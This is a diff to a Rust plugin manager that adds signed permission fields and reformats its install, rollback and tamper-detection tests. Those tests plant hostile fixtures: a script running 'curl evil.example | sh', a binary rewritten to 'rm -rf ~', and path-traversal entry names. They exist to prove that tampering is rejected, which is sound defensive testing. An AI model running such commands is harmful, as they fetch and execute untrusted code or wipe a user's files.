@@ -144,6 +144,48 @@ pub struct PluginManifestLite {
     /// plugin's own `data/` folder are not payload.
     #[serde(default)]
     pub files: BTreeMap<String, String>,
+    /// The permission detail the dispatch layer needs to build the plugin's
+    /// [`crate::plugin_host::PluginHostConfig`]: declared egress hosts, auth
+    /// bindings and data classes. Carried inside the signed manifest so the
+    /// core never has to trust unsigned package metadata. `None` for packages
+    /// signed before this field existed — dispatch then runs fail-closed
+    /// (no egress, no auth bindings, no labelled memory).
+    #[serde(default)]
+    pub permissions: Option<SignedPermissions>,
+}
+
+/// Signed permission detail mirrored from the source manifest (bridge v1
+/// `permissions` or the lite package schema). Names and scopes only — never
+/// secret values.
+#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
+pub struct SignedPermissions {
+    /// `permissions.network.hosts` — declared egress hosts.
+    #[serde(default)]
+    pub network_hosts: Vec<String>,
+    /// Hosts allowed to carry percent-encoded slashes in a path segment
+    /// (`permissions.network.encoded_slash`).
+    #[serde(default)]
+    pub encoded_slash_hosts: Vec<String>,
+    /// `permissions.auth` — secret names + schemes + scope (never values).
+    #[serde(default)]
+    pub auth: Vec<SignedAuthRule>,
+    /// `permissions.data_classes` — the closed §14.10 set as strings.
+    #[serde(default)]
+    pub data_classes: Vec<String>,
+}
+
+/// One `permissions.auth` rule as signed into the package.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct SignedAuthRule {
+    pub secret: String,
+    /// "bearer" | "header" | "basic" | "query-key" | "hmac-sha256".
+    pub scheme: String,
+    #[serde(default)]
+    pub hosts: Vec<String>,
+    #[serde(default)]
+    pub methods: Vec<String>,
+    #[serde(default)]
+    pub paths: Vec<String>,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -239,6 +281,11 @@ impl PluginManager {
     /// the tamper-evident log, not only the per-plugin audit table.
     pub fn set_audit_log(&mut self, audit: Arc<AuditLog>) {
         self.audit = Some(audit);
+    }
+
+    /// The T3rnel home directory this manager operates on.
+    pub fn home(&self) -> &Path {
+        &self.home
     }
 
     pub fn plugins_dir(&self) -> PathBuf {
@@ -549,7 +596,9 @@ impl PluginManager {
         }
         // Migrations run against existing storage; PluginStorage::migrate
         // takes its own pre-migration snapshot.
-        let rollback_marker = self.plugins_dir().join(format!("{}.rollback-snapshot", manifest.id));
+        let rollback_marker = self
+            .plugins_dir()
+            .join(format!("{}.rollback-snapshot", manifest.id));
         let migrations_run = match self.run_migrations(&manifest.id, &manifest) {
             Ok(v) => v,
             Err(e) => {
@@ -571,9 +620,15 @@ impl PluginManager {
         }
         // Remember which snapshot belongs to THIS update, so a rollback restores
         // the database only when this update changed its schema.
-        match (migrations_run.is_empty(), self.newest_snapshot(&manifest.id)) {
+        match (
+            migrations_run.is_empty(),
+            self.newest_snapshot(&manifest.id),
+        ) {
             (false, Some(snap)) => {
-                let name = snap.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default();
+                let name = snap
+                    .file_name()
+                    .map(|n| n.to_string_lossy().to_string())
+                    .unwrap_or_default();
                 let _ = fs::write(&rollback_marker, name);
             }
             _ => {
@@ -770,7 +825,9 @@ impl PluginManager {
         if let Ok(entries) = fs::read_dir(self.plugins_dir()) {
             for e in entries.flatten() {
                 let name = e.file_name().to_string_lossy().to_string();
-                let working_copy = [".staging", ".prev", ".data-keep"].iter().any(|s| name.ends_with(s));
+                let working_copy = [".staging", ".prev", ".data-keep"]
+                    .iter()
+                    .any(|s| name.ends_with(s));
                 if e.path().is_dir() && !working_copy {
                     out.push(name);
                 }
@@ -832,7 +889,10 @@ fn hash_file(path: &Path) -> std::io::Result<String> {
 /// not a plain file or directory — a symlink in a package could point at a
 /// secret outside it, and copying would follow it into the plugin's reach.
 /// `skip_data` leaves out a top-level `data/` folder (an installed plugin's own state).
-fn collect_payload(dir: &Path, skip_data: bool) -> Result<BTreeMap<String, String>, LifecycleError> {
+fn collect_payload(
+    dir: &Path,
+    skip_data: bool,
+) -> Result<BTreeMap<String, String>, LifecycleError> {
     fn walk(
         root: &Path,
         cur: &Path,
@@ -882,8 +942,12 @@ pub fn seal_package_files(pkg: &Path) -> Result<(), LifecycleError> {
     )
     .map_err(|e| LifecycleError::Manifest(e.to_string()))?;
     let files = collect_payload(pkg, false)?;
-    value["files"] = serde_json::to_value(&files).map_err(|e| LifecycleError::Manifest(e.to_string()))?;
-    fs::write(&path, serde_json::to_vec(&value).map_err(|e| LifecycleError::Manifest(e.to_string()))?)?;
+    value["files"] =
+        serde_json::to_value(&files).map_err(|e| LifecycleError::Manifest(e.to_string()))?;
+    fs::write(
+        &path,
+        serde_json::to_vec(&value).map_err(|e| LifecycleError::Manifest(e.to_string()))?,
+    )?;
     Ok(())
 }
 
@@ -994,6 +1058,7 @@ mod tests {
             permissions_summary: vec!["capability: fs.read".into(), "host: api.example.com".into()],
             entitlement_account: None,
             files: Default::default(),
+            permissions: None,
         };
         let bytes = serde_json::to_vec(&manifest).unwrap();
         fs::write(pkg.join("manifest.json"), &bytes).unwrap();
@@ -1125,6 +1190,7 @@ mod tests {
             permissions_summary: vec![],
             entitlement_account: None,
             files: Default::default(),
+            permissions: None,
         };
         fs::write(
             pkg_v2.join("manifest.json"),
@@ -1254,6 +1320,7 @@ mod tests {
             permissions_summary: vec![],
             entitlement_account: Some(entitlement.into()),
             files: Default::default(),
+            permissions: None,
         };
         let bytes = serde_json::to_vec(&manifest).unwrap();
         fs::write(pkg.join("manifest.json"), &bytes).unwrap();
@@ -1369,9 +1436,15 @@ mod tests {
         // The manifest and signature are untouched; only the executable changes.
         fs::write(pkg.join("plugin"), b"#!/bin/sh\ncurl evil.example | sh\n").unwrap();
         let err = mgr.install(&pkg, &trusted()).unwrap_err();
-        assert!(matches!(&err, LifecycleError::Signature(m) if m.contains("changed after signing")), "{err:?}");
+        assert!(
+            matches!(&err, LifecycleError::Signature(m) if m.contains("changed after signing")),
+            "{err:?}"
+        );
         assert!(mgr.list().is_empty(), "nothing may be installed");
-        assert!(!mgr.plugins_dir().join("org.test.swap.staging").exists(), "staging is cleaned up");
+        assert!(
+            !mgr.plugins_dir().join("org.test.swap.staging").exists(),
+            "staging is cleaned up"
+        );
     }
 
     #[test]
@@ -1382,7 +1455,10 @@ mod tests {
         let pkg = make_pkg(src.path(), "org.test.extra", "1.0.0", true);
         fs::write(pkg.join("backdoor.sh"), b"#!/bin/sh\n").unwrap();
         let err = mgr.install(&pkg, &trusted()).unwrap_err();
-        assert!(matches!(&err, LifecycleError::Signature(m) if m.contains("not in the signed file list")), "{err:?}");
+        assert!(
+            matches!(&err, LifecycleError::Signature(m) if m.contains("not in the signed file list")),
+            "{err:?}"
+        );
     }
 
     #[test]
@@ -1391,12 +1467,16 @@ mod tests {
         let mgr = PluginManager::new(home.path());
         let src = tempfile::tempdir().unwrap();
         let pkg = make_pkg(src.path(), "org.test.nolist", "1.0.0", true);
-        let mut v: serde_json::Value = serde_json::from_slice(&fs::read(pkg.join("manifest.json")).unwrap()).unwrap();
+        let mut v: serde_json::Value =
+            serde_json::from_slice(&fs::read(pkg.join("manifest.json")).unwrap()).unwrap();
         v["files"] = serde_json::json!({});
         fs::write(pkg.join("manifest.json"), serde_json::to_vec(&v).unwrap()).unwrap();
         resign(&pkg);
         let err = mgr.install(&pkg, &trusted()).unwrap_err();
-        assert!(matches!(&err, LifecycleError::Signature(m) if m.contains("must list")), "{err:?}");
+        assert!(
+            matches!(&err, LifecycleError::Signature(m) if m.contains("must list")),
+            "{err:?}"
+        );
     }
 
     #[test]
@@ -1408,10 +1488,20 @@ mod tests {
         // code accepted it, so anyone could ship a "signed" plugin.
         let pkg = make_pkg(src.path(), "org.test.selfsigned", "1.0.0", true);
         let err = mgr.install(&pkg, &InstallOptions::default()).unwrap_err();
-        assert!(matches!(&err, LifecycleError::Signature(m) if m.contains("no trusted signers")), "{err:?}");
-        let other = InstallOptions { require_signature: true, trusted_keys: vec!["00".repeat(32)], dev_mode: false };
+        assert!(
+            matches!(&err, LifecycleError::Signature(m) if m.contains("no trusted signers")),
+            "{err:?}"
+        );
+        let other = InstallOptions {
+            require_signature: true,
+            trusted_keys: vec!["00".repeat(32)],
+            dev_mode: false,
+        };
         let err = mgr.install(&pkg, &other).unwrap_err();
-        assert!(matches!(&err, LifecycleError::Signature(m) if m.contains("untrusted signer")), "{err:?}");
+        assert!(
+            matches!(&err, LifecycleError::Signature(m) if m.contains("untrusted signer")),
+            "{err:?}"
+        );
     }
 
     #[test]
@@ -1420,8 +1510,15 @@ mod tests {
         let mgr = PluginManager::new(home.path());
         let src = tempfile::tempdir().unwrap();
         let pkg = make_pkg(src.path(), "org.test.nosig", "1.0.0", false);
-        let lax = InstallOptions { require_signature: false, trusted_keys: vec![], dev_mode: false };
-        assert!(matches!(mgr.install(&pkg, &lax), Err(LifecycleError::Signature(_))));
+        let lax = InstallOptions {
+            require_signature: false,
+            trusted_keys: vec![],
+            dev_mode: false,
+        };
+        assert!(matches!(
+            mgr.install(&pkg, &lax),
+            Err(LifecycleError::Signature(_))
+        ));
     }
 
     #[test]
@@ -1429,7 +1526,11 @@ mod tests {
         let home = tempfile::tempdir().unwrap();
         let mgr = PluginManager::new(home.path());
         let src = tempfile::tempdir().unwrap();
-        let dev = InstallOptions { require_signature: false, trusted_keys: vec![], dev_mode: true };
+        let dev = InstallOptions {
+            require_signature: false,
+            trusted_keys: vec![],
+            dev_mode: true,
+        };
 
         // A symlink to a file outside the package would copy a secret into the plugin's reach.
         let secret = src.path().join("vault.key");
@@ -1437,20 +1538,36 @@ mod tests {
         let pkg = make_pkg(src.path(), "org.test.link", "1.0.0", false);
         std::os::unix::fs::symlink(&secret, pkg.join("notes.txt")).unwrap();
         let err = mgr.install(&pkg, &dev).unwrap_err();
-        assert!(matches!(&err, LifecycleError::Manifest(m) if m.contains("symlink")), "{err:?}");
+        assert!(
+            matches!(&err, LifecycleError::Manifest(m) if m.contains("symlink")),
+            "{err:?}"
+        );
         assert!(mgr.list().is_empty());
 
-        for bad in ["../../bin/sh", "/bin/sh", "a/b", "..", "", "-rf", "manifest.json", "plugin\0"] {
+        for bad in [
+            "../../bin/sh",
+            "/bin/sh",
+            "a/b",
+            "..",
+            "",
+            "-rf",
+            "manifest.json",
+            "plugin\0",
+        ] {
             assert!(!valid_entry_name(bad), "{bad:?}");
         }
         for good in ["plugin", "comms-plugin", "run.sh", "p_1"] {
             assert!(valid_entry_name(good), "{good:?}");
         }
         let pkg = make_pkg(src.path(), "org.test.entry", "1.0.0", false);
-        let mut v: serde_json::Value = serde_json::from_slice(&fs::read(pkg.join("manifest.json")).unwrap()).unwrap();
+        let mut v: serde_json::Value =
+            serde_json::from_slice(&fs::read(pkg.join("manifest.json")).unwrap()).unwrap();
         v["entry"] = serde_json::json!("../../../bin/sh");
         fs::write(pkg.join("manifest.json"), serde_json::to_vec(&v).unwrap()).unwrap();
-        assert!(matches!(mgr.install(&pkg, &dev), Err(LifecycleError::Manifest(_))));
+        assert!(matches!(
+            mgr.install(&pkg, &dev),
+            Err(LifecycleError::Manifest(_))
+        ));
     }
 
     #[test]
@@ -1458,13 +1575,22 @@ mod tests {
         let home = tempfile::tempdir().unwrap();
         let mgr = PluginManager::new(home.path());
         let src = tempfile::tempdir().unwrap();
-        let dev = InstallOptions { require_signature: false, trusted_keys: vec![], dev_mode: true };
+        let dev = InstallOptions {
+            require_signature: false,
+            trusted_keys: vec![],
+            dev_mode: true,
+        };
         let pkg = make_pkg(src.path(), "org.test.badmig", "1.0.0", false);
-        let mut v: serde_json::Value = serde_json::from_slice(&fs::read(pkg.join("manifest.json")).unwrap()).unwrap();
-        v["migrations"] = serde_json::json!([{"version": 1, "description": "broken", "sql": "THIS IS NOT SQL"}]);
+        let mut v: serde_json::Value =
+            serde_json::from_slice(&fs::read(pkg.join("manifest.json")).unwrap()).unwrap();
+        v["migrations"] =
+            serde_json::json!([{"version": 1, "description": "broken", "sql": "THIS IS NOT SQL"}]);
         fs::write(pkg.join("manifest.json"), serde_json::to_vec(&v).unwrap()).unwrap();
         assert!(mgr.install(&pkg, &dev).is_err());
-        assert!(mgr.list().is_empty(), "a plugin whose migration failed must not stay installed");
+        assert!(
+            mgr.list().is_empty(),
+            "a plugin whose migration failed must not stay installed"
+        );
         // The fixed package installs: no "already installed; use update" left behind.
         v["migrations"] = serde_json::json!([]);
         fs::write(pkg.join("manifest.json"), serde_json::to_vec(&v).unwrap()).unwrap();
@@ -1479,11 +1605,19 @@ mod tests {
         let src = tempfile::tempdir().unwrap();
         let pkg = make_pkg(src.path(), "org.test.launch", "1.0.0", true);
         mgr.install(&pkg, &trusted()).unwrap();
-        mgr.launch_permitted("org.test.launch").expect("an untouched install may launch");
+        mgr.launch_permitted("org.test.launch")
+            .expect("an untouched install may launch");
         // Another local process rewrites the installed binary.
-        fs::write(home.path().join("plugins/org.test.launch/plugin"), b"#!/bin/sh\nrm -rf ~\n").unwrap();
+        fs::write(
+            home.path().join("plugins/org.test.launch/plugin"),
+            b"#!/bin/sh\nrm -rf ~\n",
+        )
+        .unwrap();
         let err = mgr.launch_permitted("org.test.launch").unwrap_err();
-        assert!(matches!(&err, LifecycleError::Signature(m) if m.contains("changed after signing")), "{err:?}");
+        assert!(
+            matches!(&err, LifecycleError::Signature(m) if m.contains("changed after signing")),
+            "{err:?}"
+        );
     }
 
     #[test]
@@ -1494,7 +1628,11 @@ mod tests {
         let pkg = make_pkg(src.path(), "org.test.data", "1.0.0", true);
         mgr.install(&pkg, &trusted()).unwrap();
         fs::create_dir_all(home.path().join("plugins/org.test.data/data")).unwrap();
-        fs::write(home.path().join("plugins/org.test.data/data/state.db"), "rows").unwrap();
+        fs::write(
+            home.path().join("plugins/org.test.data/data/state.db"),
+            "rows",
+        )
+        .unwrap();
         mgr.launch_permitted("org.test.data").unwrap();
     }
 
@@ -1506,8 +1644,15 @@ mod tests {
         let pkg = make_pkg(src.path(), "org.test.revoke-later", "1.0.0", true);
         mgr.install(&pkg, &trusted()).unwrap();
         mgr.launch_permitted("org.test.revoke-later").unwrap();
-        fs::write(home.path().join("revoked-signers"), format!("{}\n", signer_hex())).unwrap();
-        assert!(matches!(mgr.launch_permitted("org.test.revoke-later"), Err(LifecycleError::Revoked(_))));
+        fs::write(
+            home.path().join("revoked-signers"),
+            format!("{}\n", signer_hex()),
+        )
+        .unwrap();
+        assert!(matches!(
+            mgr.launch_permitted("org.test.revoke-later"),
+            Err(LifecycleError::Revoked(_))
+        ));
     }
 
     // ---- rollback never destroys data -----------------------------------------------------------------------
@@ -1522,12 +1667,17 @@ mod tests {
         let home = tempfile::tempdir().unwrap();
         let mgr = PluginManager::new(home.path());
         let src = tempfile::tempdir().unwrap();
-        let dev = InstallOptions { require_signature: false, trusted_keys: vec![], dev_mode: true };
+        let dev = InstallOptions {
+            require_signature: false,
+            trusted_keys: vec![],
+            dev_mode: true,
+        };
         let v1 = make_pkg(src.path(), "org.test.rb", "1.0.0", false);
         mgr.install(&v1, &dev).unwrap();
         // v2 changes the schema, so the update takes a pre-migration snapshot.
         let v2 = make_pkg(src.path(), "org.test.rb2", "2.0.0", false);
-        let mut m: serde_json::Value = serde_json::from_slice(&fs::read(v2.join("manifest.json")).unwrap()).unwrap();
+        let mut m: serde_json::Value =
+            serde_json::from_slice(&fs::read(v2.join("manifest.json")).unwrap()).unwrap();
         m["id"] = serde_json::json!("org.test.rb");
         m["migrations"] = serde_json::json!([{"version": 1, "description": "init", "sql": "CREATE TABLE t (id INTEGER PRIMARY KEY)"}, {"version": 2, "description": "more", "sql": "CREATE TABLE u (id INTEGER PRIMARY KEY)"}]);
         fs::write(v2.join("manifest.json"), serde_json::to_vec(&m).unwrap()).unwrap();
@@ -1539,12 +1689,20 @@ mod tests {
         drop(conn);
         mgr.rollback("org.test.rb").unwrap();
         // The data written since the update is moved aside, never deleted.
-        let aside: Vec<_> = fs::read_dir(home.path().join("plugins/org.test.rb/data/snapshots")).unwrap().flatten()
-            .filter(|e| e.file_name().to_string_lossy().starts_with("pre-rollback-")).collect();
+        let aside: Vec<_> = fs::read_dir(home.path().join("plugins/org.test.rb/data/snapshots"))
+            .unwrap()
+            .flatten()
+            .filter(|e| e.file_name().to_string_lossy().starts_with("pre-rollback-"))
+            .collect();
         assert_eq!(aside.len(), 1, "the pre-rollback database must be kept");
         let kept = rusqlite::Connection::open(aside[0].path()).unwrap();
-        let n: i64 = kept.query_row("SELECT COUNT(*) FROM t WHERE id = 42", [], |r| r.get(0)).unwrap();
-        assert_eq!(n, 1, "the row written after the update survives in the kept copy");
+        let n: i64 = kept
+            .query_row("SELECT COUNT(*) FROM t WHERE id = 42", [], |r| r.get(0))
+            .unwrap();
+        assert_eq!(
+            n, 1,
+            "the row written after the update survives in the kept copy"
+        );
     }
 
     #[test]
@@ -1552,7 +1710,11 @@ mod tests {
         let home = tempfile::tempdir().unwrap();
         let mgr = PluginManager::new(home.path());
         let src = tempfile::tempdir().unwrap();
-        let dev = InstallOptions { require_signature: false, trusted_keys: vec![], dev_mode: true };
+        let dev = InstallOptions {
+            require_signature: false,
+            trusted_keys: vec![],
+            dev_mode: true,
+        };
         let v1 = make_pkg(src.path(), "org.test.rbn", "1.0.0", false);
         mgr.install(&v1, &dev).unwrap();
         write_marker_db(home.path(), "org.test.rbn", "state");
@@ -1563,15 +1725,26 @@ mod tests {
         let db = home.path().join("plugins/org.test.rbn/data/plugin.db");
         // v2 has the same migrations: the update runs none.
         let v2 = make_pkg(src.path(), "org.test.rbn-v2", "2.0.0", false);
-        let mut m: serde_json::Value = serde_json::from_slice(&fs::read(v2.join("manifest.json")).unwrap()).unwrap();
+        let mut m: serde_json::Value =
+            serde_json::from_slice(&fs::read(v2.join("manifest.json")).unwrap()).unwrap();
         m["id"] = serde_json::json!("org.test.rbn");
         fs::write(v2.join("manifest.json"), serde_json::to_vec(&m).unwrap()).unwrap();
         mgr.update(&v2, &dev).unwrap();
         mgr.rollback("org.test.rbn").unwrap();
         // (The file legitimately changes - audit rows are written - so check what it is, not its bytes.)
-        assert_ne!(fs::read(&db).unwrap(), b"OLD DATA", "an unrelated old snapshot must not replace the database");
+        assert_ne!(
+            fs::read(&db).unwrap(),
+            b"OLD DATA",
+            "an unrelated old snapshot must not replace the database"
+        );
         let conn = rusqlite::Connection::open(&db).unwrap();
-        let tables: i64 = conn.query_row("SELECT COUNT(*) FROM sqlite_master WHERE name = 't'", [], |r| r.get(0)).unwrap();
+        let tables: i64 = conn
+            .query_row(
+                "SELECT COUNT(*) FROM sqlite_master WHERE name = 't'",
+                [],
+                |r| r.get(0),
+            )
+            .unwrap();
         assert_eq!(tables, 1, "the database still has the schema v1 created");
     }
 
@@ -1591,7 +1764,10 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         let path = dir.path().join("k");
         write_private_new(&path, &[1u8; 32]).unwrap();
-        assert_eq!(fs::metadata(&path).unwrap().permissions().mode() & 0o777, 0o600);
+        assert_eq!(
+            fs::metadata(&path).unwrap().permissions().mode() & 0o777,
+            0o600
+        );
         // Never overwrites an existing key.
         assert!(write_private_new(&path, &[2u8; 32]).is_err());
         assert_eq!(fs::read(&path).unwrap(), vec![1u8; 32]);
@@ -1607,10 +1783,19 @@ mod tests {
         for _ in 0..3 {
             mgr.record_crash("org.test.quarantine").unwrap();
         }
-        assert!(matches!(mgr.launch_permitted("org.test.quarantine"), Err(LifecycleError::Quarantined(_, 3))));
+        assert!(matches!(
+            mgr.launch_permitted("org.test.quarantine"),
+            Err(LifecycleError::Quarantined(_, 3))
+        ));
         // The only thing a plugin can write is its own key-value store. It tries the crash log.
         let storage = PluginStorage::open(home.path(), "org.test.quarantine").unwrap();
         storage.kv_set("crashlog", "[]").unwrap();
-        assert!(matches!(mgr.launch_permitted("org.test.quarantine"), Err(LifecycleError::Quarantined(_, 3))), "quarantine must hold");
+        assert!(
+            matches!(
+                mgr.launch_permitted("org.test.quarantine"),
+                Err(LifecycleError::Quarantined(_, 3))
+            ),
+            "quarantine must hold"
+        );
     }
 }
